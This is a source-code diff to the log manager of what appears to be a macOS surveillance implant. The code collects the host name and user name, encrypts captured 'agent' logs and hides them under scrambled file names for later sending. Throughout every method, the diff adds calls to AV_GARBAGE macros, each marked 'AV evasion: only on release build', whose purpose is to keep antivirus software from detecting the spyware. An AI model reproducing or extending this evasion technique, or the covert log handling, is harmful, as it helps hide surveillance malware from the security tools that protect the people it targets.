@@ -23,6 +23,7 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
+#import "RCSMAVGarbage.h"
 
 static NSLock *gActiveQueueLock;
 static NSLock *gSendQueueLock;
@@ -43,12 +44,19 @@ static __m_MLogManager *sharedLogManager = nil;
 @implementation __m_MLogManager (hidden)
 
 - (BOOL)_addLogToQueue: (u_int)agentID queue: (int)queueType
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   return TRUE;
 }
 
 - (BOOL)_removeLogFromQueue: (u_int)agentID queue: (int)queueType
 {
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   return TRUE;
 }
 
@@ -57,9 +65,10 @@ static __m_MLogManager *sharedLogManager = nil;
                  agentHeader: (NSData *)anAgentHeader
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-#ifdef DEBUG_LOG_MANAGER
-  infoLog(@"");
-#endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   
   //NSString *hostName = [[NSHost currentHost] name];
   
@@ -70,14 +79,26 @@ static __m_MLogManager *sharedLogManager = nil;
   else
     hostName = @"EMPTY";
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSString *userName = NSUserName();
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   NSMutableData *logHeader = [[NSMutableData alloc] initWithLength: sizeof(logStruct)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
 #ifdef DEBUG_LOG_MANAGER
   infoLog(@"logStruct: %d", sizeof(logStruct));
 #endif
   logStruct *logRawHeader = (logStruct *)[logHeader bytes];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   switch (agentID)
     {
@@ -93,6 +114,9 @@ static __m_MLogManager *sharedLogManager = nil;
         }
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   logRawHeader->version         = LOG_VERSION;
   logRawHeader->type            = agentID;
   logRawHeader->hiTimestamp     = (int64_t)fileTime >> 32;
@@ -100,6 +124,9 @@ static __m_MLogManager *sharedLogManager = nil;
   logRawHeader->deviceIdLength  = [hostName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
   logRawHeader->userIdLength    = [userName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
   logRawHeader->sourceIdLength  = 0;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   if (anAgentHeader != nil && anAgentHeader != 0)
     logRawHeader->additionalDataLength = [anAgentHeader length];
@@ -112,6 +139,9 @@ static __m_MLogManager *sharedLogManager = nil;
                       + logRawHeader->sourceIdLength
                       + logRawHeader->additionalDataLength;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   int paddedLength = headerLength;
 
   if (paddedLength % kCCBlockSizeAES128)
@@ -119,7 +149,10 @@ static __m_MLogManager *sharedLogManager = nil;
       int pad = (paddedLength + kCCBlockSizeAES128 & ~(kCCBlockSizeAES128 - 1)) - paddedLength;
       paddedLength += pad;
     }
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   paddedLength += sizeof(int);
   
   if (paddedLength < headerLength)
@@ -128,11 +161,17 @@ static __m_MLogManager *sharedLogManager = nil;
       [outerPool release];
       return nil;
     }
-    
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   NSMutableData *rawHeader = [[NSMutableData alloc] initWithCapacity: [logHeader length]
                               + [hostName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]
                               + [userName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]
                               + [anAgentHeader length]];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   // Clear dword at the start of the file which specifies the size of the
   // unencrypted data
@@ -141,9 +180,15 @@ static __m_MLogManager *sharedLogManager = nil;
   [rawHeader appendData: logHeader];
   [rawHeader appendData: [hostName dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
   [rawHeader appendData: [userName dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [hostName release];
   [logHeader release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   if (anAgentHeader != nil)
     [rawHeader appendData: anAgentHeader];
@@ -151,24 +196,39 @@ static __m_MLogManager *sharedLogManager = nil;
   NSData *temp = [[NSData alloc] initWithBytes: gLogAesKey
                                         length: CC_MD5_DIGEST_LENGTH];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   CCCryptorStatus result = 0;
   
   // no padding on aligned blocks
   result = [rawHeader __encryptWithKey: temp];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   [temp release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   if (result == kCCSuccess)
     {
       NSMutableData *header = [[NSMutableData alloc] initWithCapacity: headerLength + sizeof(int)];
       [header appendBytes: &headerLength length: sizeof(headerLength)];
       [header appendData: rawHeader];
-          
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+      
       [rawHeader release];
       [outerPool release];
       
       return [header autorelease];
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
   
   [outerPool release];  
   return nil;
@@ -294,6 +354,9 @@ static __m_MLogManager *sharedLogManager = nil;
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   BOOL success;
   NSError *error;
   
@@ -304,6 +367,9 @@ static __m_MLogManager *sharedLogManager = nil;
   
   int32_t hiPart;
   int32_t loPart;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   do
     {
@@ -331,20 +397,33 @@ static __m_MLogManager *sharedLogManager = nil;
       infoLog(@"LogName: %@", logName);
 #endif
       
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       encryptedLogName = [NSString stringWithFormat: @"%@/%@",
                           [[NSBundle mainBundle] bundlePath],
                           [mEncryption scrambleForward: logName
                                                   seed: gLogAesKey[0]]];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       [logName release];
     }
   while ([[NSFileManager defaultManager] fileExistsAtPath: encryptedLogName] == TRUE);
   
   [encryptedLogName retain];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
 #ifdef DEBUG_LOG_MANAGER
   infoLog(@"Creating log: %@", encryptedLogName);
   infoLog(@"anAgentHeader: %@", anAgentHeader);
 #endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   success = [@"" writeToFile: encryptedLogName
                   atomically: NO
@@ -357,18 +436,30 @@ static __m_MLogManager *sharedLogManager = nil;
                                                         hiPart,
                                                         loPart];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   NSString *logPath = [NSString stringWithFormat: @"%@/%@",
                        [[NSBundle mainBundle] bundlePath], logName];
                                               
   infoLog(@"Creating clear text file: %@", logName);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   [@"" writeToFile: logPath
         atomically: NO
           encoding: NSUnicodeStringEncoding
              error: nil];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSFileHandle *clearTextHandle = [NSFileHandle fileHandleForUpdatingAtPath: logPath];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   if (clearTextHandle)
     {
       infoLog(@"Handle for clear text log acquired correctly");
@@ -377,14 +468,24 @@ static __m_MLogManager *sharedLogManager = nil;
     {
       infoLog(@"An error occurred while obtaining handle for clear text log");
     }
-    
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   [logName release];
 #endif
   
   if (success == YES)
-    {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_003
+    
       NSFileHandle *logFileHandle = [NSFileHandle fileHandleForUpdatingAtPath:
                                      encryptedLogName];
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_005
+    
       if (logFileHandle)
         {
 #ifdef DEBUG_LOG_MANAGER
@@ -392,6 +493,9 @@ static __m_MLogManager *sharedLogManager = nil;
 #endif
           NSNumber *agent   = [[NSNumber alloc] initWithUnsignedInt: agentID];
           NSNumber *_logID  = [[NSNumber alloc] initWithUnsignedInt: logID];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_006
           
 #ifdef WRITE_CLEAR_TEXT_LOG
           NSArray *keys = [NSArray arrayWithObjects: @"agentID",
@@ -410,6 +514,9 @@ static __m_MLogManager *sharedLogManager = nil;
                                                      nil];
 #endif
           NSArray *objects;
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_007
           
           if (anAgentHeader == nil)
             {
@@ -455,12 +562,18 @@ static __m_MLogManager *sharedLogManager = nil;
                                                                  forKeys: keys];
           [agentLog addEntriesFromDictionary: dictionary];
           
+          // AV evasion: only on release build
+          AV_GARBAGE_008
+          
           [gActiveQueueLock lock];
           [mActiveQueue addObject: agentLog];
           [gActiveQueueLock unlock];
           
           [agent release];
           [_logID release];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_009
           
 #ifdef DEBUG_LOG_MANAGER
           infoLog(@"activeQueue from Create: %@", mActiveQueue);
@@ -473,6 +586,9 @@ static __m_MLogManager *sharedLogManager = nil;
           NSData *logHeader = [self _createLogHeader: agentID
                                            timestamp: filetime
                                          agentHeader: anAgentHeader];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_003
           
           if (logHeader == nil)
             {
@@ -489,6 +605,9 @@ static __m_MLogManager *sharedLogManager = nil;
           infoLog(@"encrypted Header: %@", logHeader);
 #endif
           
+          // AV evasion: only on release build
+          AV_GARBAGE_002
+          
           if ([self writeDataToLog: logHeader
                          forHandle: logFileHandle] == FALSE)
             {
@@ -497,9 +616,15 @@ static __m_MLogManager *sharedLogManager = nil;
               return FALSE;
             }
           
+          // AV evasion: only on release build
+          AV_GARBAGE_001
+          
           [agentLog release];
           [encryptedLogName release];
           [outerPool release];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_000
           
           return TRUE;
         }
@@ -509,6 +634,9 @@ static __m_MLogManager *sharedLogManager = nil;
   infoLog(@"An error occurred while creating the log file");
 #endif
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   [encryptedLogName release];
   [outerPool release];
   
@@ -516,7 +644,10 @@ static __m_MLogManager *sharedLogManager = nil;
 }
 
 - (BOOL)writeDataToLog: (NSData *)aData forHandle: (NSFileHandle *)anHandle
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   @try
   {
     [anHandle writeData: aData];
@@ -533,6 +664,9 @@ static __m_MLogManager *sharedLogManager = nil;
     return FALSE;
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   return TRUE;
 }
 
@@ -542,9 +676,15 @@ static __m_MLogManager *sharedLogManager = nil;
 {
   BOOL logFound = FALSE;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   [gActiveQueueLock lock];
   NSEnumerator *enumerator = [mActiveQueue objectEnumerator];
   [gActiveQueueLock unlock];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   id anObject;
   
@@ -555,14 +695,23 @@ static __m_MLogManager *sharedLogManager = nil;
     {
       logFound = TRUE;
       
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+      
       NSFileHandle *logHandle = [anObject objectForKey: @"handle"];
       
       NSData *temp = [NSData dataWithBytes: gLogAesKey
                                     length: CC_MD5_DIGEST_LENGTH];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+      
       int _blockSize = [aData length];
       NSData *blockSize = [NSData dataWithBytes: (void *)&_blockSize
                                          length: sizeof(int)];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
       
 #ifdef WRITE_CLEAR_TEXT_LOG
       NSFileHandle *clearHandle = [anObject objectForKey: @"clearHandle"];
@@ -573,12 +722,18 @@ static __m_MLogManager *sharedLogManager = nil;
       CCCryptorStatus result = 0;
       result = [aData __encryptWithKey: temp];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       if (result == kCCSuccess)
       {
         // Writing the size of the clear text block
         [logHandle writeData: blockSize];
         // then our log data
         [logHandle writeData: aData];
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_002
         
         // increment disk quota
         [[__m_MDiskQuota sharedInstance] incUsed: [aData length] + sizeof(blockSize)];
@@ -593,6 +748,9 @@ static __m_MLogManager *sharedLogManager = nil;
   // is running but no file was created, thus we need to do it here
   //
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   //
   // TODO: There's a non-issue race condition here, this means that two files
   // could be created instead of one if the sync is running and closeActiveLogs
@@ -602,6 +760,9 @@ static __m_MLogManager *sharedLogManager = nil;
   {
     return FALSE;
   }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
   
   return TRUE;
 }
@@ -613,10 +774,16 @@ static __m_MLogManager *sharedLogManager = nil;
   NSMutableArray *tempAgentsConf    = [[NSMutableArray alloc] init];
   NSUInteger index                  = 0;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   id item;
   
   for (item in mActiveQueue)
-    {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
       int32_t agentID = [[item objectForKey: @"agentID"] intValue];
 
       if (continueLogging == YES
@@ -632,10 +799,16 @@ static __m_MLogManager *sharedLogManager = nil;
           continue;
         }
     
+    // AV evasion: only on release build
+    AV_GARBAGE_007
+    
       [[item objectForKey: @"handle"] closeFile];
       [newItems addObject: item];
       [discardedItem addIndex: index];
-      
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_003
+    
       //
       // Verifying if we need to recreate the log entry so that the agents can
       // keep logging (verify for possible races here)
@@ -644,6 +817,9 @@ static __m_MLogManager *sharedLogManager = nil;
         {
           NSNumber *tempAgentID = [NSNumber numberWithInt:
                                    [[item objectForKey: @"agentID"] intValue]];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_003
           
           id tempAgentHeader = [item objectForKey: @"header"];
           
@@ -654,17 +830,30 @@ static __m_MLogManager *sharedLogManager = nil;
                               tempAgentHeader,
                               nil];
           
+          // AV evasion: only on release build
+          AV_GARBAGE_008
+          
           NSMutableDictionary *agent = [[NSMutableDictionary alloc] init];
           NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                                  forKeys: keys];
           
+          // AV evasion: only on release build
+          AV_GARBAGE_001
+          
           [agent addEntriesFromDictionary: dictionary];
           [tempAgentsConf addObject: agent];
           [agent release];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_000
+          
         }
       
       index++;
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   [gActiveQueueLock lock];
   [gSendQueueLock lock];
@@ -675,14 +864,23 @@ static __m_MLogManager *sharedLogManager = nil;
   [gSendQueueLock unlock];
   [gActiveQueueLock unlock];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   if (continueLogging == TRUE)
     {
 #ifdef DEBUG_LOG_MANAGER
       infoLog(@"Recreating agents log");
-#endif
+#endif  
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       for (id agent in tempAgentsConf)
         {
           id agentHeader = [agent objectForKey: @"header"];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_005
           
           if ([agentHeader isKindOfClass: [NSString class]])
             {
@@ -703,11 +901,17 @@ static __m_MLogManager *sharedLogManager = nil;
               infoLog(@"agentHeader = %@", agentHeader);
 #endif
               
+              // AV evasion: only on release build
+              AV_GARBAGE_003
+              
               NSData *_agentHeader = [[NSData alloc] initWithData: [agent objectForKey: @"header"]];
               
               [self createLog: [[agent objectForKey: @"agentID"] intValue]
                   agentHeader: _agentHeader
                     withLogID: [[agent objectForKey: @"logID"] intValue]];
+              
+              // AV evasion: only on release build
+              AV_GARBAGE_002
               
               [_agentHeader release];
             }
@@ -717,6 +921,9 @@ static __m_MLogManager *sharedLogManager = nil;
 #ifdef DEBUG_LOG_MANAGER
   infoLog(@"Logs recreated correctly");
 #endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   [newItems release];
   [tempAgentsConf release];
@@ -731,8 +938,14 @@ static __m_MLogManager *sharedLogManager = nil;
   NSUInteger index                  = 0;
   id anObject;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   for (anObject in mActiveQueue)
-    {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
       if ([[anObject objectForKey: @"agentID"] unsignedIntValue] == agentID
           && ([[anObject objectForKey: @"logID"] unsignedIntValue] == logID || logID == 0))
         {
@@ -744,7 +957,10 @@ static __m_MLogManager *sharedLogManager = nil;
 #ifdef WRITE_CLEAR_TEXT_LOG
           [[anObject objectForKey: @"clearHandle"] closeFile];
 #endif
-
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_003
+          
           //
           // Now put the log in the sendQueue and remove it from the active queue
           //
@@ -767,12 +983,19 @@ static __m_MLogManager *sharedLogManager = nil;
           infoLog(@"mSendQueue: %@", mSendQueue);
           infoLog(@"mActiveQueue: %@", mActiveQueue);
 #endif
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_000
+          
           return TRUE;
         }
       index++;
     }
   
   usleep(80000);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   return FALSE;
 }
@@ -784,10 +1007,16 @@ static __m_MLogManager *sharedLogManager = nil;
   infoLog(@"Removing Log Entry from the Send queue");
 #endif
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   NSMutableIndexSet *discardedItem = [NSMutableIndexSet indexSet];
   NSUInteger index = 0;
   
   id item;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   for (item in mSendQueue)
     {
@@ -800,6 +1029,9 @@ static __m_MLogManager *sharedLogManager = nil;
       
       index++;
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   [mSendQueue removeObjectsAtIndexes: discardedItem];
   
@@ -814,6 +1046,9 @@ static __m_MLogManager *sharedLogManager = nil;
 {
   NSEnumerator *enumerator;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   [gSendQueueLock lock];
   
   if ([mSendQueue count] > 0)
@@ -822,6 +1057,9 @@ static __m_MLogManager *sharedLogManager = nil;
     enumerator = nil;
   
   [gSendQueueLock unlock];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   return enumerator;
 }
@@ -835,14 +1073,20 @@ static __m_MLogManager *sharedLogManager = nil;
 {
   NSEnumerator *enumerator;
   
-  [gActiveQueueLock lock];
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
+  [gActiveQueueLock lock];
+
   if ([mActiveQueue count] > 0)
     enumerator = [[[mActiveQueue copy] autorelease] objectEnumerator];
   else
     enumerator = nil;
   
   [gActiveQueueLock unlock];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   return enumerator;
 }
